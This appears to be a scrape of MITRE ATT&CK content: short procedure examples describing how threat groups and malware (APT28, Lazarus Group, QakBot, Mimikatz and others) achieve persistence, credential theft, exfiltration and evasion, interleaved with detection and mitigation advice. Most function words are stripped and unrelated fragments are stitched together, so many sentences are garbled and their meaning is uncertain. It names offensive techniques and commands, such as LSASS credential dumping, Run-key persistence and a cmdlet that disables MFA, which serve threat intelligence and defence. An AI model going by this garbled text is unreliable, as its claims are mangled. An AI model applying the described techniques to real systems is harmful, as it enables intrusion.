access logon scripts specific administrators. [PoetRAT](https://attack.mitre.org/software/S0428) executed Python script conjunction additional Python-based post-exploitation tools.(Citation: Talos PoetRAT April 2020) [Lokibot](https://attack.mitre.org/software/S0447) ability discover domain infected host.(Citation: FSecure Lokibot November 2019) [TAINTEDSCRIBE](https://attack.mitre.org/software/S0586) delete files compromised host.(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE 2020) [Mongall](https://attack.mitre.org/software/S1026) identify drives compromised hosts retrieve hostname `gethostbyname`.(Citation: SentinelOne Aoqin Dragon June 2022)
 [APT28](https://attack.mitre.org/groups/G0007) malicious applications steal user OAuth access tokens including applications masquerading "Google Defender" "Google Email Protection," "Google Scanner" Gmail users. targeted Yahoo users applications masquerading "Delivery Service" "McAfee Email Protection".(Citation: Trend Micro Pawn Storm OAuth 2017) [CopyKittens](https://attack.mitre.org/groups/G0052) Metasploit, [Empire](https://attack.mitre.org/software/S0363), AirVPN post-exploitation activities.(Citation: ClearSky Trend Micro Operation Wilted Tulip July 2017)(Citation: POLONIUM June 2022) [Gelsemium](https://attack.mitre.org/software/S0666) batch script delete itself.(Citation: ESET Gelsemium June 2021) [Lazarus Group](https://attack.mitre.org/groups/G0032) malware families timestomping, including modifying write timestamp Registry key random date, copying timestamp legitimate .exe files (such calc.exe mspaint.exe) dropped files.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: Novetta Blockbuster Loaders)(Citation: McAfee GhostSecret) [C0015](https://attack.mitre.org/campaigns/C0015), threat actors installed AnyDesk remote desktop application compromised network.(Citation: DFIR Conti Bazar Nov 2021) [Operation Honeybee](https://attack.mitre.org/campaigns/C0006), threat actors Visual Basic script embedded Word document download implant.(Citation: McAfee Honeybee)  [Gamaredon Group](https://attack.mitre.org/groups/G0047) file stealer transfer collected files hardcoded C2 server.(Citation: Palo Alto Gamaredon Feb 2017) [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) PowerShell execution.(Citation: Secureworks BRONZE BUTLER Oct 2017) [C0015](https://attack.mitre.org/campaigns/C0015), threat actors collected files network shared drives prior network encryption.(Citation: DFIR Conti Bazar Nov 2021) Update software regularly employing patch management externally exposed applications. [Higaisa](https://attack.mitre.org/groups/G0126) <code>ipconfig</code> gather network configuration information.(Citation: Malwarebytes Higaisa 2020)(Citation: Zscaler Higaisa 2020) [Javali](https://attack.mitre.org/software/S0528) delivered malicious e-mail attachments.(Citation: Securelist Brazilian Banking Malware July 2020) [Mustang Panda](https://attack.mitre.org/groups/G0129) malicious PowerShell scripts enable execution.(Citation: Crowdstrike MUSTANG PANDA June 2018)(Citation: Anomali MUSTANG PANDA October 2019) [Pupy](https://attack.mitre.org/software/S0192) adds startup folder adds Registry key <code>SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code> persistence.(Citation: GitHub Pupy) Ensure proper policies implemented dictate secure enrollment deactivation authentication mechanisms, MFA, user accounts. [Melcoz](https://attack.mitre.org/software/S0530) gained execution victims malicious links.(Citation: Securelist Brazilian Banking Malware July 2020) Monitor API calls (such <code>GetAdaptersInfo()</code> <code>GetIpNetTable()</code>) gather details network configuration settings, IP MAC addresses. [Tonto Team](https://attack.mitre.org/groups/G0131) EternalBlue exploits lateral movement.(Citation: TrendMicro Tonto Team October 2020) (Citation: Secureworks BRONZE PRESIDENT December 2019) [HEXANE](https://attack.mitre.org/groups/G1001) enumerated programs installed infected machine.(Citation: Kaspersky Lyceum October 2021) [OilRig](https://attack.mitre.org/groups/G0049) <code>net localgroup administrators</code> local administrators compromised systems.(Citation: Palo Alto OilRig 2016) [Lazarus Group](https://attack.mitre.org/groups/G0032) routinely deleted log files compromised router, including automatic log deletion logrotate utility.(Citation: Kaspersky ThreatNeedle Feb 2021)  [Night Dragon](https://attack.mitre.org/campaigns/C0002), threat actors remote administration tools persistent infiltration channels.(Citation: McAfee Night Dragon)  Check remediate unneeded existing authentication certificates common abusable misconfigurations settings permissions, certificate enrollment permissions published overly permissive certificate templates (which define settings created certificates). example, certificate templates checked Certificate Authority MMC snap-in (`certsrv.msc`). `certutil.exe` examine database.(Citation: SpecterOps Certified Pre Owned)(Citation: GitHub PSPKIAudit)(Citation: GitHub Certify) [Rclone](https://attack.mitre.org/software/S1040) exfiltrate data SFTP HTTPS WebDAV.(Citation: Rclone) [Sandworm Team](https://attack.mitre.org/groups/G0034) created email accounts mimic legitimate organizations spearphishing operations.(Citation: District Court Indictment GRU Unit 74455 October 2020) Monitor executed commands arguments usage profiles tool, profiles install -type=configuration. (Citation: FireEye APT33 Guardrail)(Citation: Symantec Elfin Mar 2019) [FIN10](https://attack.mitre.org/groups/G0051) stolen credentials connect remotely victim networks VPNs protected single factor.(Citation: FireEye FIN10 June 2017) [MimiPenguin](https://attack.mitre.org/software/S0179) dump process memory extract clear-text credentials.(Citation: MimiPenguin GitHub 2017) [Ember Bear](https://attack.mitre.org/groups/G1003) spearphishing emails malicious links.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) [APT33](https://attack.mitre.org/groups/G0064) valid accounts initial access privilege escalation.(Citation: FireEye APT33 Webinar Sept 2017)(Citation: FireEye APT33 Guardrail) [SUGARDUMP](https://attack.mitre.org/software/S1042) variant C2.(Citation: Mandiant UNC3890 Aug 2022) [Turla](https://attack.mitre.org/groups/G0010) modified variables kernel memory Driver Signature Enforcement exploiting vulnerabilities kernel mode privileges.(Citation: Unit42 AcidBox June 2020)(Citation: GitHub Turla Driver Loader) [Emotet](https://attack.mitre.org/software/S0367) observed leveraging module scrape email addresses Outlook.(Citation: CIS Emotet Dec 2018)(Citation: IBM IcedID November 2017) [Dok](https://attack.mitre.org/software/S0281) AppleScript install login Item sending Apple events <code>System Events</code> process.(Citation: hexed osx.dok analysis 2019) [Cardinal RAT](https://attack.mitre.org/software/S0348) communicate multiple C2 host port combinations.(Citation: PaloAlto CardinalRat Apr 2017) [Machete](https://attack.mitre.org/groups/G0095) msiexec install [Machete](https://attack.mitre.org/software/S0409) malware.(Citation: 360 Machete Sep 2020) Enforce role-based access control limit accounts privileges require. Cloud Access Security Broker (CASB) set usage policies manage user permissions cloud applications prevent access application access tokens. Kubernetes applications, set “automountServiceAccountToken: false” YAML specification pods require access service account tokens.(Citation: Kubernetes Hardening Guide) [SYNful Knock](https://attack.mitre.org/software/S0519) capability add custom backdoor password modifies operating network device.(Citation: Mandiant - Synful Knock) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. [RTM](https://attack.mitre.org/software/S0148) check specific files directories virtualization malware analysis.(Citation: Unit42 Redaman January 2019) [Seth-Locker](https://attack.mitre.org/software/S0639) encrypt files targeted system, appending suffix .seth.(Citation: Trend Micro Ransomware February 2021) Monitor newly constructed processes command-lines "wmic" [RGDoor](https://attack.mitre.org/software/S0258) decodes Base64 strings decrypts strings custom XOR algorithm.(Citation: Unit 42 RGDoor Jan 2018) [QUADAGENT](https://attack.mitre.org/software/S0269) PowerShell scripts execution.(Citation: Unit 42 QUADAGENT July 2018) [Turla](https://attack.mitre.org/groups/G0010) attempted trick targets clicking link featuring seemingly legitimate domain Adobe.com download malware gain initial access.(Citation: ESET Turla Mosquito Jan 2018) [Attor](https://attack.mitre.org/software/S0438)’s plugin deletes collected files log files exfiltration.(Citation: ESET Attor Oct 2019) Limit permissions users user create tokens. setting defined local account only. GPO: Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Create token object. (Citation: Create Token) define create process level token local network service GPO: Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Replace process level token.(Citation: Replace Process Token)

Administrators log standard user tools administrator privileges built-in access token manipulation command <code>runas</code>.(Citation: runas) [Magic Hound](https://attack.mitre.org/groups/G0059) social media channels (such LinkedIn) messaging services (such WhatsApp) spearphish victims.(Citation: SecureWorks Mia Ash July 2017)(Citation: Phosphorus Mar 2019)(Citation: ClearSky Kittens 3 August 2020) [3PARA RAT](https://attack.mitre.org/software/S0066) command set attributes creation/modification timestamps files.(Citation: CrowdStrike Putter Panda) [SMOKEDHAM](https://attack.mitre.org/software/S0649) execute Powershell commands C2 server.(Citation: FireEye SMOKEDHAM June 2021) [Fox Kitten](https://attack.mitre.org/groups/G0117) Amazon Services host C2.(Citation: ClearSky Pay2Kitten December 2020) [Anchor](https://attack.mitre.org/software/S0504) delete dropper malware deployed.(Citation: Cyberreason Anchor December 2019) Monitor anomalous authentication activity, logons user session activity unknown accounts SAML tokens 4769 1200 events domain.(Citation: Sygnia Golden SAML). Monitor unexpected abnormal access resources, including access websites cloud-based applications user locations systems match expected configurations. logins occur on-premises resources cloud environment trusts credentials.(Citation: SolarWinds Customer Guidance) [Chimera](https://attack.mitre.org/groups/G0114) utilized scans queries domain controllers remote services target environment.(Citation: NCC Chimera January 2021) [PcShare](https://attack.mitre.org/software/S1050) delete persistence mechanisms registry.(Citation: Bitdefender FunnyDream Campaign November 2020) [Stuxnet](https://attack.mitre.org/software/S0603) attempts access network resources domain account’s credentials.(Citation: Symantec W.32 Stuxnet Dossier) [njRAT](https://attack.mitre.org/software/S0385) search list running processes Tr.exe.(Citation: Trend Micro njRAT 2018) [menuPass](https://attack.mitre.org/groups/G0045) changing malicious files legitimate.(Citation: District Court NY APT10 Indictment December 2018) [Naikon](https://attack.mitre.org/groups/G0019) DLL side-loading load malicious DLL's legitimate executables.(Citation: CheckPoint Naikon 2020) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. [Calisto](https://attack.mitre.org/software/S0274) hidden directory named .calisto store data victim’s machine exfiltration.(Citation: Securelist Calisto July 2018)(Citation: Symantec Calisto July 2018) [Cobalt Strike](https://attack.mitre.org/software/S0154) Window admin shares (C$ ADMIN$) lateral movement.(Citation: Cobalt Strike TTPs Dec 2017) Browser sandboxes mitigate impact exploitation, sandbox escapes exist. (Citation: Windows Blogs Edge Sandbox) (Citation: Ars Technica Pwn2Own 2017 VM Escape)

Other types virtualization application microsegmentation mitigate impact client-side exploitation. Risks additional exploits weaknesses systems exist. (Citation: Ars Technica Pwn2Own 2017 VM Escape) [Comnie](https://attack.mitre.org/software/S0244) achieves persistence adding shortcut startup path Registry.(Citation: Palo Alto Comnie) [APT-C-36](https://attack.mitre.org/groups/G0099) embedded VBScript malicious Word document executed document opening.(Citation: QiAnXin APT-C-36 Feb2019) [GoldenSpy](https://attack.mitre.org/software/S0493)'s uninstaller base64-encoded variables. (Citation: Trustwave GoldenSpy2 June 2020) (Citation: Symantec Dragonfly)(Citation: Gigamon Berserk Bear October 2021) [BITTER](https://attack.mitre.org/groups/G1002) exploited Office vulnerabilities CVE-2012-0158, CVE-2017-11882, CVE-2018-0798, CVE-2018-0802.(Citation: Cisco Talos Bitter Bangladesh 2022)(Citation: Forcepoint BITTER Pakistan Oct 2016) [XCSSET](https://attack.mitre.org/software/S0658) <code>plutil</code> command modify <code>LSUIElement</code>, <code>DFBundleDisplayName</code>, <code>CFBundleIdentifier</code> <code>/Contents/Info.plist</code> file change [XCSSET](https://attack.mitre.org/software/S0658) visible system.(Citation: trendmicro xcsset xcode project 2020) Authentication logs audit logins specific applications, determining malicious logins benign logins difficult activity matches typical user behavior. [HermeticWiper](https://attack.mitre.org/software/S0697) ability Volume Shadow service.(Citation: Qualys Hermetic Wiper March 2022) Monitoring Windows authentication logs determining authenticated network shares established account, correlate network share activity events investigate malicious activity. Monitor abnormal usage GFlags tool common processes spawned abnormal parents creation flags indicative debugging <code>DEBUG_PROCESS</code> <code>DEBUG_ONLY_THIS_PROCESS</code>. (Citation: Dev Blog IFEO Mar 2010) Monitor newly executed processes abuse Office add-ins persistence compromised system.  [Bumblebee](https://attack.mitre.org/software/S1039) PowerShell execution.(Citation: Medium Ali Salem Bumblebee April 2022) [FinFisher](https://attack.mitre.org/software/S0182) extracts decrypts stage 3 malware, stored encrypted resources.(Citation: FinFisher Citation)(Citation: FinFisher March 2018) [Leviathan](https://attack.mitre.org/groups/G0065) targeted RDP credentials victim environment.(Citation: FireEye APT40 March 2019)  [KOCTOPUS](https://attack.mitre.org/software/S0669) obfuscated scripts BatchEncryption tool.(Citation: MalwareBytes LazyScripter Feb 2021) [Threat Group-3390](https://attack.mitre.org/groups/G0027) tool WMI execute binary.(Citation: Nccgroup Emissary Panda 2018) Monitor Active Directory scripts automatically executed boot logon initialization establish persistence. [Emotet](https://attack.mitre.org/software/S0367) custom packers protect payloads.(Citation: Trend Micro Emotet Jan 2019) Monitor unexpected deletion absence cloud block storage volumes . reduce false positives, valid change management procedures introduce identifier logged change tag header) supported cloud provider, distinguish valid, expected actions malicious ones. version [KONNI](https://attack.mitre.org/software/S0356) searches filenames created previous version malware, suggesting versions targeted victims versions together.(Citation: Talos Konni 2017) [RedLeaves](https://attack.mitre.org/software/S0153) enumerate search files directories.(Citation: PWC Cloud Hopper Technical Annex April 2017)(Citation: FireEye APT10 April 2017) [menuPass](https://attack.mitre.org/groups/G0045) DLL side-loading launch versions Mimikatz PwDump6 [UPPERCUT](https://attack.mitre.org/software/S0275).(Citation: PWC Cloud Hopper Technical Annex April 2017)(Citation: FireEye APT10 Sept 2018)(Citation: Symantec Cicada November 2020) [Proxysvc](https://attack.mitre.org/software/S0238) collects network adapter domain/username based current remote sessions.(Citation: McAfee GhostSecret) [at](https://attack.mitre.org/software/S0110) schedule task executed specific time.(Citation: TechNet At)(Citation: Linux at) [Taidoor](https://attack.mitre.org/software/S0011) encrypted string blocks obfuscation.(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021) Script blocking extensions prevent execution scripts HTA files commonly exploitation process. malicious code served ads, adblockers prevent code executing place. [Caterpillar WebShell](https://attack.mitre.org/software/S0572) module download upload files system.(Citation: ClearSky Lebanese Cedar Jan 2021)  [WhisperGate](https://attack.mitre.org/software/S0689) disguised JPG extension avoid detection malicious file.(Citation: Medium S2W WhisperGate January 2022) services aid tracking certificates sites Internet. pivot pieces certificate uncover adversary infrastructure.(Citation: Splunk Kovar Certificates 2017)
Detection efforts focused behaviors, [Web Protocols](https://attack.mitre.org/techniques/T1071/001) [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002). [Cobalt Strike](https://attack.mitre.org/software/S0154) `rundll32.exe` load DLL command line.(Citation: Cobalt Strike Manual 4.3 November 2020)(Citation: DFIR Conti Bazar Nov 2021) [Pteranodon](https://attack.mitre.org/software/S0147) mshta.exe execute HTA file hosted remote server.(Citation: Symantec Shuckworm January 2022) [QakBot](https://attack.mitre.org/software/S0650) Base64 encode C2.(Citation: Crowdstrike Qakbot October 2020)(Citation: Kaspersky QakBot September 2021) [KEYMARBLE](https://attack.mitre.org/software/S0271) command create Registry entries storing data <code>HKEY_CURRENT_USER\SOFTWARE\Microsoft\WABE\DataPath</code>.(Citation: US-CERT KEYMARBLE Aug 2018) [Ramsay](https://attack.mitre.org/software/S0458) executed malicious e-mail attachments.(Citation: Antiy CERT Ramsay April 2020) [RunningRAT](https://attack.mitre.org/software/S0253) code data clipboard.(Citation: McAfee Gold Dragon) initial compromise, [Chaos](https://attack.mitre.org/software/S0220) download stage establish permanent presence system.(Citation: Chaos Stolen Backdoor) Users trained identify social engineering techniques spearphishing emails malicious links includes phishing consent OAuth 2.0. Additionally, users perform visual checks domains visit; however, homographs ASCII IDN domains render manual checks difficult. Phishing training cybersecurity training raise awareness check URLs visiting sites. [Valak](https://attack.mitre.org/software/S0476) ability enumerate domain admin accounts.(Citation: Cybereason Valak 2020) [Arp](https://attack.mitre.org/software/S0099) display ARP configuration host.(Citation: TechNet Arp) [Tarrask](https://attack.mitre.org/software/S1011) create “hidden” scheduled tasks deleting Security Descriptor (`SD`) registry value.(Citation: Tarrask scheduled task) [QakBot](https://attack.mitre.org/software/S0650) VBS download execute malicious files.(Citation: Trend Micro Qakbot 2020)
(Citation: Kroll Qakbot June 2020)(Citation: Crowdstrike Qakbot October 2020)(Citation: Trend Micro Qakbot December 2020)(Citation: Cyberint Qakbot 2021)(Citation: IB Ransomware September 2020) Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. Signatures unique indicators protocols based specific C2 protocol adversary tool, malware families versions. Adversaries change tool C2 signatures time construct protocols avoid detection common defensive tools. (Citation: University Birmingham C2) Monitor AppInit_DLLs Registry values modifications correlate software, patch cycles, etc. [Zebrocy](https://attack.mitre.org/software/S0251) URL/Percent Encoding data exfiltrated POST requests.(Citation: Accenture SNAKEMACKEREL Nov 2018) [BlackEnergy](https://attack.mitre.org/software/S0089) 2 "Destroy" plug-in destroys data stored victim hard drives overwriting file contents.(Citation: Securelist BlackEnergy Feb 2015)(Citation: ESET BlackEnergy Jan 2016) [Fox Kitten](https://attack.mitre.org/groups/G0117) searched network shares access sensitive documents.(Citation: CISA AA20-259A Iran-Based Actor September 2020) [Ferocious](https://attack.mitre.org/software/S0679) ability add Class current user Registry hive enable persistence mechanisms.(Citation: Kaspersky WIRTE November 2021) perform UAC bypasses user local administrator system, difficult target detection variations. Efforts mitigation collecting process launches actions performed UAC bypass performed. UAC bypass methods rely modifying specific, user-accessible Registry settings. Analysts monitor Registry settings unauthorized changes. [ServHelper](https://attack.mitre.org/software/S0382) modules [schtasks](https://attack.mitre.org/software/S0111) carry malicious operations.(Citation: Proofpoint TA505 Jan 2019) [Cardinal RAT](https://attack.mitre.org/software/S0348) downloaded port 443.(Citation: PaloAlto CardinalRat Apr 2017) [OwaAuth](https://attack.mitre.org/software/S0072) incoming requests username keyword commands handles instructions perform actions.(Citation: Dell TG-3390) [Cobalt Group](https://attack.mitre.org/groups/G0080) created services establish persistence.(Citation: IB Cobalt Aug 2017) [LiteDuke](https://attack.mitre.org/software/S0513) enumerate account targeted system.(Citation: ESET Dukes October 2019) Monitor unexpected processes interacting lsass.exe.(Citation: Medium Detecting Attempts Steal Passwords Memory) Common credential dumpers  [Mimikatz](https://attack.mitre.org/software/S0002) access LSA Subsystem Service (LSASS) process process, locating LSA secrets key, decrypting sections memory credential details, including Kerberos tickets, stored. Monitor unusual processes accessing <code>secrets.ldb</code> <code>.secrets.mkey</code> located <code>/var/lib/sss/secrets/</code>. (Citation: Proofpoint Leviathan Oct 2017)(Citation: CISA AA21-200A APT40 July 2021)(Citation: Accenture MUDCARP March 2019) [Diavol](https://attack.mitre.org/software/S0659) receive configuration updates additional payloads including wscpy.exe C2.(Citation: Fortinet Diavol July 2021) Properly configure firewalls proxies limit outgoing traffic ports network segment. [Get2](https://attack.mitre.org/software/S0460) ability identify current username infected host.(Citation: Proofpoint TA505 October 2019) [REvil](https://attack.mitre.org/software/S0496) identify domain membership compromised host.(Citation: Kaspersky Sodin July 2019)(Citation: McAfee Sodinokibi October 2019)(Citation: Secureworks REvil September 2019) [POSHSPY](https://attack.mitre.org/software/S0150) modifies timestamps downloaded executables match randomly selected file created prior 2013.(Citation: FireEye POSHSPY April 2017) [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) batch scripts command-line interface execution.(Citation: Secureworks BRONZE BUTLER Oct 2017) [APT32](https://attack.mitre.org/groups/G0050) includes garbage code mislead anti-malware software researchers.(Citation: ESET OceanLotus)(Citation: ESET OceanLotus Mar 2019) [WarzoneRAT](https://attack.mitre.org/software/S0670) communicate C2 server TCP port 5200.(Citation: Check Warzone Feb 2020) [PinchDuke](https://attack.mitre.org/software/S0048) steals credentials compromised hosts. [PinchDuke](https://attack.mitre.org/software/S0048)'s credential stealing functionality believed based source code Pinch credential stealing malware (also LdPinch). Credentials targeted [PinchDuke](https://attack.mitre.org/software/S0048) include sources Navigator, Mozilla Firefox, Mozilla Thunderbird, Internet Explorer. (Citation: F-Secure Dukes) Monitor newly constructed network connections [Valid Accounts](https://attack.mitre.org/techniques/T1078) remotely control machines Virtual Network Computing (VNC). VNC legitimate depending environment it’s used. factors, access patterns activity occurs remote login, suspicious malicious behavior VNC.  [Remexi](https://attack.mitre.org/software/S0375) takes screenshots windows interest.(Citation: Securelist Remexi Jan 2019) Query systems process thread token inconsistencies user owns processes impersonating local account.(Citation: BlackHat Atkinson Winchester Token Manipulation) inconsistencies fields store PPID information, EventHeader ProcessId data collected Event Tracing Windows (ETW), Creator Process ID/Name Windows event logs, ProcessID ParentProcessID (which produced ETW utilities Task Manager Process Explorer). ETW EventHeader ProcessId identifies actual parent process. Monitor newly constructed web-based network connections malicious suspicious destinations (e.g. destinations attributed phishing campaigns). correlation process monitoring command detect anomalous processes execution command arguments (e.g. monitor anomalies files initiate network connections unusual connections initiated regsvr32.exe, rundll.exe, .SCF, HTA, MSI, DLLs, msiexec.exe). [Lokibot](https://attack.mitre.org/software/S0447) delete dropped files bypassing UAC.(Citation: Talos Lokibot Jan 2021) variant [ADVSTORESHELL](https://attack.mitre.org/software/S0045) encrypts C2 RSA.(Citation: Bitdefender APT28 Dec 2015) [GrimAgent](https://attack.mitre.org/software/S0632)  pad C2 messages random generated values.(Citation: IB GrimAgent July 2021) Continuous monitoring vulnerability sources automatic manual code review tools implemented well.(Citation: OWASP 10) [QakBot](https://attack.mitre.org/software/S0650) collect including OS version domain compromised host.(Citation: Crowdstrike Qakbot October 2020)(Citation: ATT QakBot April 2021)(Citation: IB Ransomware September 2020) Monitor executed commands arguments attempt access credential material stored process memory Local Security Authority Subsystem Service (LSASS). Remote access tools built-in features incorporate existing tools Mimikatz. PowerShell scripts exist credential dumping functionality, PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) require additional logging features configured operating collect analysis. [OopsIE](https://attack.mitre.org/software/S0264) SmartAssembly obfuscator pack embedded .Net Framework assembly C2.(Citation: Unit 42 OopsIE! Feb 2018) Network intrusion detection prevention systems network signatures prevent traffic remote access services. [RTM](https://attack.mitre.org/software/S0148) strings, network data, configuration, modules encrypted modified RC4 algorithm. [RTM](https://attack.mitre.org/software/S0148) delivered targets archive files including ZIP, 7-ZIP, RAR.(Citation: ESET RTM Feb 2017)(Citation: Unit42 Redaman January 2019) Monitor contextual data file, include name, content (ex: signature, headers, data/media), user/ower, permissions, etc. [HEXANE](https://attack.mitre.org/groups/G1001) VisualBasic script named `MicrosoftUpdator.vbs` execution PowerShell keylogger.(Citation: Kaspersky Lyceum October 2021) AADInternals `Set-AADIntUserMFA` command disable MFA user. [FlawedAmmyy](https://attack.mitre.org/software/S0381) collected files compromised machine.(Citation: Korean FSI TA505 2020) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. [BITTER](https://attack.mitre.org/groups/G1002) registered variety domains host malicious payloads C2.(Citation: Forcepoint BITTER Pakistan Oct 2016) [StrongPity](https://attack.mitre.org/software/S0491) <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code> Registry key persistence.(Citation: Talos Promethium June 2020) [OutSteel](https://attack.mitre.org/software/S1017) C2 communications.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) [Pony](https://attack.mitre.org/software/S0453) <code>NetUserEnum</code> function enumerate local accounts.(Citation: Malwarebytes Pony April 2016)	 [Empire](https://attack.mitre.org/software/S0363) implementation [Mimikatz](https://attack.mitre.org/software/S0002) gather credentials memory.(Citation: Github PowerShell Empire) [Bazar](https://attack.mitre.org/software/S0534) downloads hosted Google Docs.(Citation: Cybereason Bazar July 2020)(Citation: Zscaler Bazar September 2020) [Carberp](https://attack.mitre.org/software/S0484)'s bootkit inject malicious DLL address space running processes.(Citation: ESET Carberp March 2012) Monitor processes command-line parameters signed binaries proxy execution malicious files. Compare invocations signed binaries proxy execution prior history arguments loaded files determine anomalous adversarial activity. Legitimate programs suspicious ways, msiexec.exe downloading MSI file Internet, indicative intrusion. Correlate activity suspicious behavior reduce false positives normal benign users administrators. Configure access controls firewalls limit access domain controllers systems create manage accounts. [Linfo](https://attack.mitre.org/software/S0211) creates backdoor remote attackers data local systems.(Citation: Symantec Linfo 2012) (Citation: FireEye APT10 Sept 2018) Enterprise email solutions monitoring mechanisms include ability audit auto-forwarding rules regular basis.

In Exchange environment, Administrators Get-InboxRule discover remove malicious auto-forwarding rules.(Citation: Tim McMichael Exchange Mail Forwarding 2)  [HALFBAKED](https://attack.mitre.org/software/S0151) OS, processor, BIOS.(Citation: FireEye FIN7 April 2017) [Scarlet Mimic](https://attack.mitre.org/groups/G0029) left-to-right override character self-extracting RAR archive spearphishing attachment file names.(Citation: Scarlet Mimic Jan 2016) Monitor newly executed processes MSBuild.exe. Compare invocations binaries prior history arguments executed binaries determine anomalous adversarial activity. [Confucius](https://attack.mitre.org/groups/G0142) file stealer checks Document, Downloads, Desktop, Picture folders documents images specific extensions.(Citation: TrendMicro Confucius APT Aug 2021) [LitePower](https://attack.mitre.org/software/S0680) send collected data, including screenshots, C2 channel.(Citation: Kaspersky WIRTE November 2021) (Citation: PWC Cloud Hopper Technical Annex April 2017) [Daserf](https://attack.mitre.org/software/S0187) C2.(Citation: Secureworks BRONZE BUTLER Oct 2017) SSL/TLS inspection contents encrypted sessions network-based indicators malware communication protocols. (Citation: Secureworks BRONZE PRESIDENT December 2019) Monitor newly constructed files running virtual instance, binary files common virtualization technologies (ex: VirtualBox, VMware, QEMU, Hyper-V). Monitor newly executed processes gain persistence elevate privileges executing malicious content triggered PowerShell profiles. Monitor newly constructed files written extensions headers compressed encrypted file types. Detection efforts focus follow-on exfiltration activity, compressed encrypted files detected transit network intrusion detection data loss prevention analyzing file headers. Monitor executed commands arguments gather victim's hosts targeting. [Sakula](https://attack.mitre.org/software/S0074) samples install services persistence calling WinExec <code>net start</code> argument.(Citation: Dell Sakula) (Citation: CrowdStrike Ryuk January 2019)(Citation: Red Canary Hospital Thwarted Ryuk October 2020)(Citation: FireEye KEGTAP SINGLEMALT October 2020)(Citation: DFIR Ryuk's Return October 2020)(Citation: DFIR Ryuk 2 Hour Speed November 2020)(Citation: DFIR Ryuk 5 Hours October 2020)(Citation: Sophos Ryuk Attack October 2020) Enforce proxies dedicated servers services DNS systems communicate respective ports/protocols, systems network.  [Gamaredon Group](https://attack.mitre.org/groups/G0047) created scheduled tasks launch executables designated minutes passed.(Citation: ESET Gamaredon June 2020)(Citation: CERT-EE Gamaredon January 2021)(Citation: Actinium February 2022)	 [WarzoneRAT](https://attack.mitre.org/software/S0670) enumerate directories compromise host.(Citation: Check Warzone Feb 2020) Windows 10, enable Attack Surface Reduction (ASR) rules prevent Office applications creating child processes writing malicious executable content disk. (Citation: win10_asr) [Bazar](https://attack.mitre.org/software/S0534) loader dual-extension executable files PreviewReport.DOC.exe.(Citation: Cybereason Bazar July 2020) [Sandworm Team](https://attack.mitre.org/groups/G0034) Telegram Bot API Telegram Messenger send receive commands Python backdoor. [Sandworm Team](https://attack.mitre.org/groups/G0034) legitimate M.E.Doc software update check requests sending receiving commands hosted malicious payloads putdrive.com.(Citation: ESET Telebots Dec 2016)(Citation: ESET Telebots June 2017) [Valak](https://attack.mitre.org/software/S0476) ability enumerate local admin accounts.(Citation: Cybereason Valak 2020) [WastedLocker](https://attack.mitre.org/software/S0612) payload includes encrypted strings stored .bss binary file.(Citation: NCC WastedLocker June 2020)    [Tropic Trooper](https://attack.mitre.org/groups/G0081) shellcode XOR algorithm decrypt payload. [Tropic Trooper](https://attack.mitre.org/groups/G0081) decrypted image files contained payload.(Citation: Unit 42 Tropic Trooper Nov 2016)(Citation: TrendMicro Tropic Trooper 2020) [IceApple](https://attack.mitre.org/software/S1022) Active Directory Querier module  perform authenticated requests Active Directory server.(Citation: CrowdStrike IceApple 2022) [Metamorfo](https://attack.mitre.org/software/S0455) disguised MSI file Adobe Acrobat Reader Installer masqueraded payloads OneDrive, WhatsApp, Spotify, example.(Citation: Medium Metamorfo Apr 2020)(Citation: ESET Casbaneiro Oct 2019)  [VERMIN](https://attack.mitre.org/software/S0257) download upload files victim's machine.(Citation: Unit 42 VERMIN Jan 2018) [HermeticWiper](https://attack.mitre.org/software/S0697) ability corrupt disk partitions raw disk access destroy data.(Citation: Crowdstrike DriveSlayer February 2022)(Citation: SentinelOne Hermetic Wiper February 2022) [SideTwist](https://attack.mitre.org/software/S0610) collect targeted system.(Citation: Check APT34 April 2021) [Hydraq](https://attack.mitre.org/software/S0203) creates backdoor remote attackers adjust token privileges.(Citation: Symantec Hydraq Jan 2010) (Citation: Secureworks BRONZE BUTLER Oct 2017) [APT28](https://attack.mitre.org/groups/G0007) brute-force/password-spray tooling operated modes: password-spraying mode conducted authentication attempts hour targeted account days weeks.(Citation: STRONTIUM Patterns Cred Harvesting Sept 2020)(Citation: Targeting Elections September 2020) [APT28](https://attack.mitre.org/groups/G0007) Kubernetes cluster conduct distributed, large-scale password spray attacks.(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021) [FatDuke](https://attack.mitre.org/software/S0512) AES encrypt C2 communications.(Citation: ESET Dukes October 2019) Monitor newly constructed image existing, legitimate external service exfiltrate data primary command control channel. Automatically mail data events log server data repository prevent conditions adversary locate manipulate data local system. possible, minimize time delay event reporting avoid prolonged storage local system.  [Night Dragon](https://attack.mitre.org/campaigns/C0002), threat actors Cain & Abel crack password hashes.(Citation: McAfee Night Dragon) [Daserf](https://attack.mitre.org/software/S0187) leverages [Mimikatz](https://attack.mitre.org/software/S0002) [Windows Credential Editor](https://attack.mitre.org/software/S0005) steal credentials.(Citation: Symantec Tick Apr 2016) [Crimson](https://attack.mitre.org/software/S0115) custom TCP protocol C2.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020)	  Monitor Registry SSP Registry keys. Windows 8.1 Windows Server 2012 R2 generate events unsigned SSP DLLs load LSA setting Registry key <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\LSASS.exe</code> AuditLevel = 8. (Citation: Graeber 2014) (Citation: Configure LSA) 